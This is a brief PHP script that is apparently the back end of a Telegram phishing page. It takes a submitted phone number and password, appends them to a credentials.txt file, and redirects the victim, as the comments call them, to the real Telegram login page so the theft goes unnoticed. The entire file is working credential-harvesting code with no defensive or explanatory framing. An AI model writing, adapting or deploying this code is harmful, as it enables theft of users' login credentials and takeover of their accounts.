<?php
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    // Save the captured login credentials to a file or database
    file_put_contents('credentials.txt', $phone . ':' . $password . "\n", FILE_APPEND);

    // Redirect the victim to the real Telegram login page
    header('Location: https://telegram.org/login');
    exit;
?>